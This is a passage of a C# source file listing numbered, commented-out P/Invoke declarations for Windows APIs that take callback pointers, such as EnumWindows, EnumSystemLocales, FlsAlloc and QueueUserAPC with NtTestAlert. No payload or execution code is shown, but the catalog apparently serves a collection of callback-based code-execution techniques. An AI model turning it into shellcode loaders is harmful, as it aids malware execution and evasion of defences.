            HANDLE hProcess,
            string RootPath,
            string InputPathName,
            string OutputPathBuffer,
            IntPtr cb,
            IntPtr data
        );

        [DllImport("DbgHelp", ExactSpelling = true)]
        public static extern bool EnumDirTreeW(
            HANDLE hProcess,
            string RootPath,
            string InputPathName,
            string OutputPathBuffer,
            IntPtr cb,
            IntPtr data
        );
        */

        //[28]
        //EnumDisplayMonitors
        /*
        [DllImport("user32.dll")]
        static extern bool EnumDisplayMonitors(
            IntPtr hdc,
            IntPtr lprcClip,
            IntPtr lpfnEnum,
            IntPtr dwData
        );
        */

        //[29]
        //EnumerateLoadedModules
        //EnumerateLoadedModules64
        //EnumerateLoadedModulesW64
        /*
        [DllImport("dbghelp.dll")]
        private static extern bool EnumerateLoadedModules(
            IntPtr hprocess,
            IntPtr EnumerateLoadedModules_Callback,
            IntPtr usercontext
        );

        [DllImport("dbghelp.dll")]
        private static extern bool EnumerateLoadedModules64(
            IntPtr hprocess,
            IntPtr EnumerateLoadedModules_Callback,
            IntPtr usercontext
        );

        [DllImport("dbghelp.dll")]
        private static extern bool EnumerateLoadedModulesW64(
            IntPtr hprocess,
            IntPtr EnumerateLoadedModules_Callback,
            IntPtr usercontext
        );
        */

        //[2A]
        //EnumerateLoadedModulesEx
        //EnumerateLoadedModulesExW
        /*
        [DllImport("dbghelp.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool EnumerateLoadedModulesEx(
            IntPtr hProcess,
            IntPtr EnumLoadedModulesCallback,
            [In, Optional] IntPtr UserContext
        );

        [DllImport("dbghelp.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool EnumerateLoadedModulesExW(
            IntPtr hProcess,
            IntPtr EnumLoadedModulesCallback,
            [In, Optional] IntPtr UserContext
        );
        */

        //[2B]
        //EnumLanguageGroupLocales
        //EnumLanguageGroupLocalesA
        //EnumLanguageGroupLocalesW
        /*
        [StructLayout(LayoutKind.Explicit, Size = 4)]
        public struct LGRPID
        {
            public static readonly LGRPID LGRPID_WESTERN_EUROPE = 0x0001;
            public static readonly LGRPID LGRPID_CENTRAL_EUROPE = 0x0002;
            public static readonly LGRPID LGRPID_BALTIC = 0x0003;
            public static readonly LGRPID LGRPID_GREEK = 0x0004;
            public static readonly LGRPID LGRPID_CYRILLIC = 0x0005;
            public static readonly LGRPID LGRPID_TURKIC = 0x0006;
            public static readonly LGRPID LGRPID_TURKISH = 0x0006;
            public static readonly LGRPID LGRPID_JAPANESE = 0x0007;
            public static readonly LGRPID LGRPID_KOREAN = 0x0008;
            public static readonly LGRPID LGRPID_TRADITIONAL_CHINESE = 0x0009;
            public static readonly LGRPID LGRPID_SIMPLIFIED_CHINESE = 0x000a;
            public static readonly LGRPID LGRPID_THAI = 0x000b;
            public static readonly LGRPID LGRPID_HEBREW = 0x000c;
            public static readonly LGRPID LGRPID_ARABIC = 0x000d;
            public static readonly LGRPID LGRPID_VIETNAMESE = 0x000e;
            public static readonly LGRPID LGRPID_INDIC = 0x000f;
            public static readonly LGRPID LGRPID_GEORGIAN = 0x0010;
            public static readonly LGRPID LGRPID_ARMENIAN = 0x0011;

            [FieldOffset(0)]
            private uint _value;
            public override string ToString() => _value.ToString();
            public static implicit operator uint(LGRPID val) => val._value;
            public static implicit operator LGRPID(uint val) => new LGRPID { _value = val };
        }

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumLanguageGroupLocales(
            IntPtr lpLangGroupLocaleEnumProc,
            uint LanguageGroup,
            uint dwFlags,
            int lParam
        );

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumLanguageGroupLocalesA(
            IntPtr lpLangGroupLocaleEnumProc,
            uint LanguageGroup,
            uint dwFlags,
            int lParam
        );

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumLanguageGroupLocalesW(
            IntPtr lpLangGroupLocaleEnumProc,
            uint LanguageGroup,
            uint dwFlags,
            int lParam
        );
        */

        //[2C]
        //EnumObjects
        /*
        [DllImport("user32.dll", EntryPoint = "GetDC")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        static extern int EnumObjects(
            IntPtr hdc,
            int nObjectType,
            IntPtr lpObjectFunc,
            IntPtr lParam
        );
        */

        //[2D]
        //EnumPageFiles
        //EnumPageFilesA
        //EnumPageFilesW
        /*
        [DllImport("psapi", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool EnumPageFiles(
            IntPtr proc,
            IntPtr context
        );

        [DllImport("psapi", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool EnumPageFilesA(
            IntPtr proc,
            IntPtr context
        );

        [DllImport("psapi", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool EnumPageFilesW(
            IntPtr proc,
            IntPtr context
        );
        */

        //[2E]
        //EnumProps
        /*
        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(
            IntPtr hWnd
        );

        [DllImport("user32.dll")]
        static extern int EnumProps(
            IntPtr hWnd,
            IntPtr lpEnumFunc
        );
        */

        //[2F]
        //EnumPropsEx
        //EnumPropsExA
        //EnumPropsExW
        /*
        [DllImport("user32.dll")]
        static extern IntPtr GetTopWindow(
            IntPtr hWnd
        );

        [DllImport("user32.dll")]
        static extern int EnumPropsEx(
            IntPtr hWnd,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("user32.dll")]
        static extern int EnumPropsExA(
            IntPtr hWnd,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("user32.dll")]
        static extern int EnumPropsExW(
            IntPtr hWnd,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );
        */

        //[30]
        //EnumPwrSchemes
        /*
        [DllImport("powrprof.dll", SetLastError = true)]
        private static extern bool EnumPwrSchemes(
            IntPtr lpfnPwrSchemesEnumProc,
            int lParam
        );
        */

        //[31]
        //EnumResourceTypes
        //EnumResourceTypesA
        //EnumResourceTypesW
        /*
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool EnumResourceTypes(
            IntPtr hModule,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("kernel32.dll")]
        public static extern bool EnumResourceTypesA(
            IntPtr hModule,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("kernel32.dll")]
        public static extern bool EnumResourceTypesW(
            IntPtr hModule,
            IntPtr lpEnumFunc,
            IntPtr lParam
        );
        */

        //[32]
        //EnumResourceTypesEx
        //EnumResourceTypesExA
        //EnumResourceTypesExW
        /*
        [Flags]
        public enum RESOURCE_ENUM : int
        {
            RESOURCE_ENUM_LN = 0x0001,
            RESOURCE_ENUM_MUI = 0x0002,
            RESOURCE_ENUM_MUI_SYSTEM = 0x0004,
            RESOURCE_ENUM_VALIDATE = 0x0008,
            RESOURCE_UPDATE_LN = 0x0010,
            RESOURCE_UPDATE_MUI = 0x0020
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool EnumResourceTypesEx(
            IntPtr module,
            IntPtr callback,
            int unused,
            RESOURCE_ENUM flags,
            int langid
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool EnumResourceTypesExA(
            IntPtr module,
            IntPtr callback,
            int unused,
            RESOURCE_ENUM flags,
            int langid
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool EnumResourceTypesExW(
            IntPtr module,
            IntPtr callback,
            int unused,
            RESOURCE_ENUM flags,
            int langid
        );
        */

        //[33]
        //EnumSystemCodePages
        //EnumSystemCodePagesA
        //EnumSystemCodePagesW
        /*
        [DllImport("Kernel32.dll")]
        public static extern bool EnumSystemCodePages(
            IntPtr lpLocaleEnumProc,
            int dwFlags
        );

        [DllImport("kernel32.dll")]
        public static extern bool EnumSystemCodePagesA(
            IntPtr lpCodePageEnumProc,
            uint dwFlags
        );

        [DllImport("kernel32.dll")]
        public static extern bool EnumSystemCodePagesW(
            IntPtr lpCodePageEnumProc,
            uint dwFlags
        );
        */

        //[34]
        //EnumSystemGeoID
        /*
        public const int GEOCLASS_NATION = 16;

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumSystemGeoID(
            uint GeoClass,
            int ParentGeoId,
            IntPtr lpGeoEnumProc
        );
        */

        //[35]
        //EnumSystemLanguageGroups
        //EnumSystemLanguageGroupsA
        //EnumSystemLanguageGroupsW
        /*
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumSystemLanguageGroups(
            IntPtr lpLanguageGroupEnumProc,
            int dwFlags,
            int lParam
        );

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumSystemLanguageGroupsA(
            IntPtr lpLanguageGroupEnumProc,
            int dwFlags,
            int lParam
        );

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumSystemLanguageGroupsW(
            IntPtr lpLanguageGroupEnumProc,
            int dwFlags,
            int lParam
        );
        */

        //[36]
        //EnumSystemLocales
        //EnumSystemLocalesA
        //EnumSystemLocalesW
        /*
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int EnumSystemLocales(
                IntPtr lpLocaleEnumProc,
                uint dwFlags
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int EnumSystemLocalesA(
                IntPtr lpLocaleEnumProc,
                uint dwFlags
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int EnumSystemLocalesW(
                IntPtr lpLocaleEnumProc,
                uint dwFlags
        );
        */

        //[37]
        //EnumSystemLocalesEx
        /*
        public enum LOCALETYPE : uint
        {
            LOCALE_ALL = 0x00000000, // enumerate all named based locales
            LOCALE_WINDOWS = 0x00000001, // shipped locales and/or replacements for them
            LOCALE_SUPPLEMENTAL = 0x00000002, // supplemental locales only
            LOCALE_ALTERNATE_SORTS = 0x00000004, // alternate sort locales
            LOCALE_NEUTRALDATA = 0x00000010, // Locales that are "neutral" (language only, region data is default)
            LOCALE_SPECIFICDATA = 0x00000020, // Locales that contain language and region data
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool EnumSystemLocalesEx(
            IntPtr pEnumProcEx,
            LOCALETYPE dwFlags,
            int lParam,
            IntPtr lpReserved
        );
        */

        //[38]
        //EnumThreadWindows
        /*
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool EnumThreadWindows(
            uint dwThreadId,
            IntPtr lpfn,
            IntPtr lParam
        );
        */

        //[39]
        //EnumTimeFormats
        //EnumTimeFormatsA
        //EnumTimeFormatsW
        /*
        [DllImport("kernel32.dll")]
        public static extern int EnumTimeFormats(
            IntPtr lpTimeFmtEnumProc,
            int Locale,
            int dwFlags
        );

        [DllImport("kernel32.dll")]
        public static extern int EnumTimeFormatsA(
            IntPtr lpTimeFmtEnumProc,
            int Locale,
            int dwFlags
        );

        [DllImport("kernel32.dll")]
        public static extern int EnumTimeFormatsW(
            IntPtr lpTimeFmtEnumProc,
            int Locale,
            int dwFlags
        );
        */

        //[3A]
        //EnumTimeFormatsEx
        /*
        const string LOCALE_NAME_SYSTEM_DEFAULT = "!x-sys-default-locale";

        [Flags]
        [global::System.CodeDom.Compiler.GeneratedCode("Microsoft.Windows.CsWin32", "0.2.104-beta+6d86f35b75")]
        internal enum TIME_FORMAT_FLAGS : uint
        {
            TIME_NOMINUTESORSECONDS = 0x00000001,
            TIME_NOSECONDS = 0x00000002,
            TIME_NOTIMEMARKER = 0x00000004,
            TIME_FORCE24HOURFORMAT = 0x00000008,
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        public  static extern bool EnumTimeFormatsEx(
            IntPtr lpTimeFmtEnumProcEx,
            string lpLocaleName,
            TIME_FORMAT_FLAGS dwFlags,
            IntPtr lParam
        );
        */

        //[3B]
        //EnumUILanguages
        //EnumUILanguagesA
        //EnumUILanguagesW
        /*
        const uint MUI_LANGUAGE_ID = 0x4;    // Use traditional language ID convention
        const uint MUI_LANGUAGE_NAME = 0x8;    // Use ISO language (culture) name convention

        [DllImport("kernel32.dll")]
        static extern bool EnumUILanguages(
            IntPtr pUILanguageEnumProc,
            uint dwFlags,
            IntPtr lParam
        );

        [DllImport("kernel32.dll")]
        static extern bool EnumUILanguagesA(
            IntPtr pUILanguageEnumProc,
            uint dwFlags,
            IntPtr lParam
        );
        [DllImport("kernel32.dll")]
        static extern bool EnumUILanguagesW(
            IntPtr pUILanguageEnumProc,
            uint dwFlags,
            IntPtr lParam
        );
        */

        //[3C]
        //EnumWindows
        /*
        [DllImport("user32.dll")]
        private static extern int EnumWindows(
            IntPtr callPtr,
            int lPar
        );
        */

        //[3D]
        //EnumWindowStations
        //EnumWindowStationsA
        //EnumWindowStationsW
        /*
        [DllImport("user32.dll")]
        static extern bool EnumWindowStations(
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("user32.dll")]
        static extern bool EnumWindowStationsA(
            IntPtr lpEnumFunc,
            IntPtr lParam
        );

        [DllImport("user32.dll")]
        static extern bool EnumWindowStationsW(
            IntPtr lpEnumFunc,
            IntPtr lParam
        );
        */

        //[3E]
        //EvtSubscribe_CVEEventWrite
        /*
        [DllImport("Wevtapi.dll")]
        static extern IntPtr EvtSubscribe(
            IntPtr hSession,
            IntPtr SignalEvent,
            [MarshalAs(UnmanagedType.LPWStr)] string ChannelPath,
            [MarshalAs(UnmanagedType.LPWStr)] string Query,
            IntPtr Bookmark,
            IntPtr Context,
            IntPtr Callback,
            uint Flags
        );

        [DllImport("Advapi32.dll")]
        static extern long CveEventWrite(
            string CveId,
            string AdditionalDetails
        );

        [DllImport("Wevtapi.dll")]
        static extern bool EvtClose(
            IntPtr hEvent
        );
        */

        //[3F]
        //FCICreate
        /*
        [DllImport("Cabinet.dll")]
        public extern static IntPtr FCICreate(
            ref IntPtr perf,
            IntPtr pfnfcifp,
            IntPtr pfna,
            IntPtr pfnf,
            IntPtr pfnopen,
            IntPtr pfnread,
            IntPtr pfnwrite,
            IntPtr pfnclose,
            IntPtr pfnseek,
            IntPtr pfndelete,
            IntPtr pfnfcigtf,
            IntPtr pv
        );
        */

        //[40]
        //FindText
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct FINDREPLACE
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public uint Flags;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrFindWhat;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpstrReplaceWith;
            public ushort wFindWhatLen;
            public ushort wReplaceWithLen;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public IntPtr lpTemplateName;
        }

        [DllImport("comdlg32.dll", CharSet = CharSet.Auto)]
        static extern IntPtr FindText(
            ref FINDREPLACE lpfr
        );

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        */

        //[41]
        //FlsAlloc
        /*
        [DllImport("kernel32.dll")]
        static extern IntPtr ConvertThreadToFiber(
            IntPtr lpParameter
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(
            IntPtr callback
        );

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FlsSetValue(
            IntPtr dwFlsIndex,
            IntPtr lpFlsData
        );
        */

        //[42]
        //GetOpenFileName
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OpenFileName
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public string lpstrFilter;
            public string lpstrCustomFilter;
            public int nMaxCustFilter;
            public int nFilterIndex;
            public string lpstrFile;
            public int nMaxFile;
            public string lpstrFileTitle;
            public int nMaxFileTitle;
            public string lpstrInitialDir;
            public string lpstrTitle;
            public int Flags;
            public short nFileOffset;
            public short nFileExtension;
            public string lpstrDefExt;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr pvReserved;
            public int dwReserved;
            public int flagsEx;
        }

        [DllImport("comdlg32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool GetOpenFileName(
            ref OpenFileName ofn
        );
        */

        //[43]
        //GetSaveFileName
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OpenFileName
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public string lpstrFilter;
            public string lpstrCustomFilter;
            public int nMaxCustFilter;
            public int nFilterIndex;
            public string lpstrFile;
            public int nMaxFile;
            public string lpstrFileTitle;
            public int nMaxFileTitle;
            public string lpstrInitialDir;
            public string lpstrTitle;
            public int Flags;
            public short nFileOffset;
            public short nFileExtension;
            public string lpstrDefExt;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr pvReserved;
            public int dwReserved;
            public int flagsEx;
        }

        [DllImport("comdlg32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool GetSaveFileName(
            ref OpenFileName ofn
        );
        */

        //[44]
        //GrayString
        //GrayStringA
        //GrayStringW
        /*
        [DllImport("User32.dll")]
        public extern static IntPtr GetDC(
            IntPtr hWnd
        );

        [DllImport("User32.dll")]
        public extern static bool GrayString(
            IntPtr hDC,
            IntPtr hBrush,
            IntPtr lpOutputFunc,
            IntPtr lpData,
            int nCount,
            int x,
            int y,
            int nWidth,
            int nHeigth
        );

        [DllImport("User32.dll")]
        public extern static bool GrayStringA(
            IntPtr hDC,
            IntPtr hBrush,
            IntPtr lpOutputFunc,
            IntPtr lpData,
            int nCount,
            int x,
            int y,
            int nWidth,
            int nHeigth
        );

        [DllImport("User32.dll")]
        public extern static bool GrayStringW(
            IntPtr hDC,
            IntPtr hBrush,
            IntPtr lpOutputFunc,
            IntPtr lpData,
            int nCount,
            int x,
            int y,
            int nWidth,
            int nHeigth
        );

        [DllImport("User32.dll")]
        public extern static IntPtr ReleaseDC(
            IntPtr hWnd,
            IntPtr hDC
        );
        */

        //[45]
        //ImageGetDigestStream
        /*
        [Flags]
        enum EFileAccess : uint
        {
            AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
            MaximumAllowed = 0x2000000,     // MaximumAllowed access type

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,        // file & pipe
            FILE_LIST_DIRECTORY = 0x0001,       // directory
            FILE_WRITE_DATA = 0x0002,       // file & pipe
            FILE_ADD_FILE = 0x0002,         // directory
            FILE_APPEND_DATA = 0x0004,      // file
            FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
            FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
            FILE_READ_EA = 0x0008,          // file & directory
            FILE_WRITE_EA = 0x0010,         // file & directory
            FILE_EXECUTE = 0x0020,          // file
            FILE_TRAVERSE = 0x0020,         // directory
            FILE_DELETE_CHILD = 0x0040,     // directory
            FILE_READ_ATTRIBUTES = 0x0080,      // all
            FILE_WRITE_ATTRIBUTES = 0x0100,     // all

            GENERIC_READ = 0x80000000,
            GENERIC_WRITE = 0x40000000,
            GENERIC_EXECUTE = 0x20000000,
            GENERIC_ALL = 0x10000000,

            SPECIFIC_RIGHTS_ALL = 0x00FFFF,
            FILE_ALL_ACCESS = StandardRightsRequired | Synchronize | 0x1FF,
            FILE_GENERIC_READ = StandardRightsRead | FILE_READ_DATA | FILE_READ_ATTRIBUTES | FILE_READ_EA | Synchronize,
            FILE_GENERIC_WRITE = StandardRightsWrite | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | Synchronize,
            FILE_GENERIC_EXECUTE = StandardRightsExecute | FILE_READ_ATTRIBUTES | FILE_EXECUTE | Synchronize
        }

        const int FILE_SHARE_READ = 1;
        const int OPEN_EXISTING = 3;
        const short FILE_ATTRIBUTE_NORMAL = 0x80;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
             string filename,
             uint access,
             int share,
             IntPtr securityAttributes, // optional SECURITY_ATTRIBUTES struct or IntPtr.Zero
             int creationDisposition,
             short flagsAndAttributes,
             IntPtr templateFile
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr CreateFileA(
            string filename,
            uint access,
            int share,
            IntPtr securityAttributes,
            int creationDisposition,
            short flagsAndAttributes,
            IntPtr templateFile
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr CreateFileW(
            string filename,
            uint access,
            int share,
            IntPtr securityAttributes,
            int creationDisposition,
            short flagsAndAttributes,
            IntPtr templateFile
        );

        [DllImport("Imagehlp.dll")]
        private static extern bool ImageGetDigestStream(
            IntPtr filehandle,
            uint DigestLevel,
            IntPtr DigestFunction,
            IntPtr DigestHandle
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(
            IntPtr hObject
        );
        */

        //[46]
        //ImmEnumInputContext
        /*
        [DllImport("Imm32.dll")]
        public static extern bool ImmEnumInputContext(
            uint idThread,
            IntPtr lpfn,
            IntPtr lParam
        );
        */

        //[47]
        //InitOnceExecuteOnce
        /*
        public struct InitOnce
        {
            // Empty struct
        }

        [DllImport("Kernel32.dll")]
        public static extern bool InitOnceExecuteOnce(
            ref InitOnce initOnce,
            IntPtr InitFn,
            IntPtr Parameter,
            out IntPtr Context
        );
        */

        //[48]
        //InternetSetStatusCallback
        /*
        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr InternetOpen(
           string lpszAgent,
           int dwAccessType,
           string lpszProxyName,
           string lpszProxyBypass,
           int dwFlags
        );

        [DllImport("Wininet.dll")]
        static extern IntPtr InternetSetStatusCallback(
            IntPtr hInternet,
            IntPtr lpfnInternetCallback
        );

        [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr InternetConnect(
           IntPtr hInternet,
           string lpszServerName,
           short nServerPort,
           string lpszUsername,
           string lpszPassword,
           int dwService,
           int dwFlags,
           IntPtr dwContext
        );

        [DllImport("wininet.dll", SetLastError = true)]
        static extern bool InternetCloseHandle(
            IntPtr hInternet
        );
        */

        //[49]
        //LdrEnumerateLoadedModules
        /*
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr LdrEnumerateLoadedModules(
            IntPtr hProcess,
            IntPtr pModules,
            int cb
        );
        */

        //[4A]
        //LineDDA
        /*
        [DllImport("Gdi32.dll")]
        public extern static bool LineDDA(
            int xStart,
            int yStart,
            int xEnd,
            int yEnd,
            IntPtr lpProc,
            IntPtr data
        );
        */

        //[4B]
        //MFAddPeriodicCallback
        /*
        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern uint MFStartup(
            ulong Version,
            uint dwFlags
        );

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern uint MFAddPeriodicCallback(
            IntPtr Callback,
            IntPtr pContext,
            out uint dwKey);

        [DllImport("Mfplat.dll", SetLastError = true)]
        static extern IntPtr MFShutdown();
        */

        //[4C]
        //MiniDumpWriteDump
        /*
        [StructLayout(LayoutKind.Sequential, Pack = 4)]  // Pack=4 is important! So it works also for x64!
        struct MiniDumpExceptionInformation
        {
            public uint ThreadId;
            public IntPtr ExceptionPointers;
            [MarshalAs(UnmanagedType.Bool)]
            public bool ClientPointers;
        }

        [DllImport("dbghelp.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(
            IntPtr hProcess,
            int processId,
            IntPtr hFile,
            int dumpType,
            ref MiniDumpExceptionInformation expParam,
            IntPtr userStreamParam,
            ref IntPtr callbackParam
        );
        */

        //[4D]
        //NotifyIpInterfaceChange
        /*
        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyIpInterfaceChange(
            uint Family,
            IntPtr Callback,
            IntPtr CallerContext,
            bool InitialNotification,
            ref IntPtr NotificationHandle
        );
        */

        //[4E]
        //NotifyNetworkConnectivityHintChange
        /*
        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyNetworkConnectivityHintChange(
            IntPtr Callback,
            IntPtr CallerContext,
            bool InitialNotification,
            out IntPtr NotificationHandle
        );
        */

        //[4F]
        //NotifyRouteChange2
        /*
        [DllImport("Iphlpapi.dll")]
        public static extern IntPtr NotifyRouteChange2(
             uint AddressFamily,
             IntPtr Callback,
             IntPtr CallerContext,
             bool InitialNotification,
             ref IntPtr NotificationHandle
        );
        */

        //[50]
        //NotifyTeredoPortChange
        /*
        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyTeredoPortChange(
            IntPtr Callback,
            IntPtr CallerContext,
            bool InitialNotification,
            ref IntPtr NotificationHandle
        );
        */

        //[51]
        //NotifyUnicastIpAddressChange
        /*
        [DllImport("Iphlpapi.dll")]
        static extern IntPtr NotifyUnicastIpAddressChange(
            uint Family,
            IntPtr Callback,
            IntPtr CallerContext,
            bool InitialNotification,
            ref IntPtr NotificationHandle
        );
        */

        //[52]
        //NtTestAlert
        /*
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            IntPtr dwData
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtTestAlert();
        */

        //[53]
        //OleUIBusy
        /*
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OLEUIBUSY
        {
            public uint cbStruct;
            public uint dwFlags;
            public IntPtr hWndOwner;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpszCaption;
            public IntPtr lpfnHook;
            public IntPtr lCustData;
            public IntPtr hInstance;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpszTemplate;
            public IntPtr hResource;
            public IntPtr hTask;
            public IntPtr lphWndDialog;
        }

        [DllImport("OleDlg.dll")]
        public extern static bool OleUIBusy(
            ref OLEUIBUSY unnamedParam1
        );

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        */

        //[54]
        //PerfStartProviderEx
        /*
        struct PERF_PROVIDER_CONTEXT
        {
            public uint ContextSize;
            public uint Reserved;
            public IntPtr ControlCallback;
            public IntPtr MemAllocRoutine;
            public IntPtr MemFreeRoutine;
            public IntPtr pMemContext;
        }

        [DllImport("advapi32.dll")]
        static extern ulong PerfStartProviderEx(
             ref Guid ProviderGuid,
             ref PERF_PROVIDER_CONTEXT ProviderContext,
             out IntPtr hProvider
        );

        [DllImport("advapi32.dll")]
        static extern ulong PerfStopProvider(
            IntPtr hProvider
        );
        */

        //[55]
        //PowerRegisterForEffectivePowerModeNotifications
        /*
        [DllImport("Powrprof.dll")]
        static extern IntPtr PowerRegisterForEffectivePowerModeNotifications(
            ulong Version,
            IntPtr Callback,
            IntPtr Context,
            ref IntPtr RegistrationHandle
        );
        */

        //[56]
        //PrintDlg
        /*
        [StructLayout(LayoutKind.Sequential)]
        public class PRINTDLG
        {
            public uint lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hDevMode;
            public IntPtr hDevNames;
            public IntPtr hDC;
            public uint Flags;
            public ushort nFromPage;
            public ushort nToPage;
            public ushort nMinPage;
            public ushort nMaxPage;
            public ushort nCopies;
            public IntPtr hInstance;
            public IntPtr lCustData;
            public IntPtr lpfnPrintHook;
            public IntPtr lpfnSetupHook;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpPrintTemplateName;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpSetupTemplateName;
            public IntPtr hPrintTemplate;
            public IntPtr hSetupTemplate;
        }

        [DllImport("comdlg32.dll")]
        static extern bool PrintDlg(
            [In, Out] PRINTDLG lppd
        );
        */

        //[57]
        //ReadFileEx
        /*
        [Flags]
        enum EFileAccess : uint
        {
            AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
            MaximumAllowed = 0x2000000,     // MaximumAllowed access type

            Delete = 0x10000,
            ReadControl = 0x20000,
            WriteDAC = 0x40000,
            WriteOwner = 0x80000,
            Synchronize = 0x100000,

            StandardRightsRequired = 0xF0000,
            StandardRightsRead = ReadControl,
            StandardRightsWrite = ReadControl,
            StandardRightsExecute = ReadControl,
            StandardRightsAll = 0x1F0000,
            SpecificRightsAll = 0xFFFF,

            FILE_READ_DATA = 0x0001,        // file & pipe
            FILE_LIST_DIRECTORY = 0x0001,       // directory
            FILE_WRITE_DATA = 0x0002,       // file & pipe
            FILE_ADD_FILE = 0x0002,         // directory
            FILE_APPEND_DATA = 0x0004,      // file
            FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
            FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
            FILE_READ_EA = 0x0008,          // file & directory
            FILE_WRITE_EA = 0x0010,         // file & directory
            FILE_EXECUTE = 0x0020,          // file
            FILE_TRAVERSE = 0x0020,         // directory
            FILE_DELETE_CHILD = 0x0040,     // directory
